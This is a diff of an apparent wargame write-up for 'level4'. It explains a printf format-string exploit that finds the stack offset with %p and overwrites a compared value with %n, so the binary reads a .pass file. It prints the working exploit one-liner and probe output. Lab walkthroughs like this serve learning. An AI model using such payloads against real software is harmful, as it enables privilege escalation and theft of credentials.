@@ -1,5 +1,31 @@
-I mean, it's literally the exact same exploit as level3, so I'm not going to
-overextend. The only difference is that the value compared is much much bigger,
-and system directly calls a cat on .pass instead of opening a shell.
+so we saw that the main fonction make a syscall.
 
-Exploit: python -c 'print "\x10\x98\x04\x08%16930112x%12$n"' | ./level4
+before that the main executes the fonction p who makes a call to printf,
+then the main make a compare between the register eax and an address.
+if the compare is equal, the main make a syscall.
+
+so we wanted that.
+first we start by finding the position of the address who is used by printf :
+
+python -c 'print "AAAA" + "%p "*20' | ./level4 
+
+AAAA0xb7ff26b0 0xbffff684 0xb7fd0ff4 (nil) (nil) 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 
+0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+
+%p is a format specifer for the address
+so we see that is 12.
+
+python -c 'print "AAAA" + "%12$p"' | ./level4 
+
+"$12" allow us to only use the 12 agrument.
+
+but we want to write in 0x8049810 who is the address send by p and compared with
+0x1025544
+
+so we use the format specifer n who print the number of characters who was already 
+write in the string.
+
+
+the exploit : python -c 'print "\x10\x98\x04\x08%16930112x" + "%12$n"' | ./level4
+
+python -c 'print "\x10\x98\x04\x08%16930112x" + "%12$n"' | ./level4
